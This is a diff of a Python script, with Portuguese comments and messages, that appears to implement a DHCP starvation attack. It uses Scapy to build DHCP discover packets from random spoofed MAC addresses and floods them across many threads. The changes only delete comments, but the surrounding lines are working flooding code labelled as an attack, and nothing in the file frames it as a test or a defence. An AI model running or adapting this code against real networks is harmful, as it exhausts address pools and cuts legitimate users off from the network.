@@ -22,7 +22,6 @@ def montar_discover(mac_falso):
     mac_bytes = bytes.fromhex(mac_falso.replace(":", ""))
     xid_aleatorio = random.randint(1, 0xFFFFFFFF)
 
-    # Aqui não precisa de try/except, pois só estamos montando o pacote na memória
     pacote = (
         Ether(src=mac_falso, dst="ff:ff:ff:ff:ff:ff") /
         IP(src="0.0.0.0", dst="255.255.255.255") /
@@ -43,12 +42,11 @@ def enviar_discover(interface):
     mac = gerar_mac()
     pacote = montar_discover(mac)
     
-    # O try/except vai AQUI, onde o pacote é enviado
+
     try:
         send(pacote, iface=interface, verbose=False)
     except PermissionError:
         print(Fore.RED + "[-] Erro de permissão: você precisa rodar como root (use sudo).")
-        # Podemos parar o programa todo se não tiver root
         import sys
         sys.exit(1) 
     except Exception as e:
@@ -67,7 +65,6 @@ def iniciar_ataque(interface, num_threads, pacote_por_thread):
 
     threads = []
     for i in range(num_threads):
-        # Coloquei daemon=True pra ele morrer se você apertar Ctrl+C
         t = threading.Thread(target=atacar, args=(interface, pacote_por_thread), daemon=True)
         threads.append(t)
         t.start()
@@ -79,7 +76,7 @@ def iniciar_ataque(interface, num_threads, pacote_por_thread):
     except KeyboardInterrupt:
         print(Fore.YELLOW + "\n[!] Ataque interrompido com ^C")
         
-    # Fora do for e do try, roda apenas uma vez no final
+     
     print(Fore.GREEN + "[*] Ataque finalizado")
 
 if __name__ == "__main__":
